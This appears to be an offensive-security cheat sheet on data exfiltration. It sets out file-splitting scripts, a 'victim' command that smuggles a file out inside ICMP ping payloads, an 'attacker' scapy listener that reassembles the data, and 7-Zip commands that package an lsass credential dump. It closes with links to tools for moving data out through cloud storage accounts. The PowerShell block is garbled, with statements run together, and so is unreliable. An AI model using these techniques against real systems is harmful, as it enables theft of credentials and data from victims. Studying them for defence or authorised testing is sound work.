# Exfiltration

*** 

## Data transfer size limit

### Split data in powershell

```powershell
$upperBound= 50MB # calculated by Powershell$ext= "log"$rootName= "log_"$reader= new-objectSystem.IO.StreamReader("C:\Exceptions.log")
$count= 1$fileName= "{0}{1}.{2}"-f ($rootName, $count, $ext)
while(($line= $reader.ReadLine()) -ne $null)
{
    Add-Content -path $fileName-value $lineif((Get-ChildItem -path $fileName).Length -ge $upperBound)
    {
        ++$count$fileName= "{0}{1}.{2}"-f ($rootName, $count, $ext)
    }
}
$reader.Close()
```

### Split command

```bash
split YourLogFile.txt -b 500m
```

### Split data with icmp

#### Victim

```bash
xxd -p -c 4 backup.php | while read line; do ping -c 1 -p $line 127.0.0.1; done
```

#### Ataccker

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

### Compress data with 7zip

```cmd
c:\programdata\7z.exe a -t7z c:\programdata\lsass.7z c:\programdata\lsass.dmp
c:\programdata\7z.exe e nooranet.zip
```

## Exfiltration over other network medium

* Wifi
* Cellular 
* Bluetooth

## Exfiltration over cloud account

### Google drive

https://github.com/prasmussen/gdrive/releases

### One drive

  https://github.com/lionello/onedrive-cli

### Cloudflare

https://github.com/mantvydasb/Invoke-PowerCloud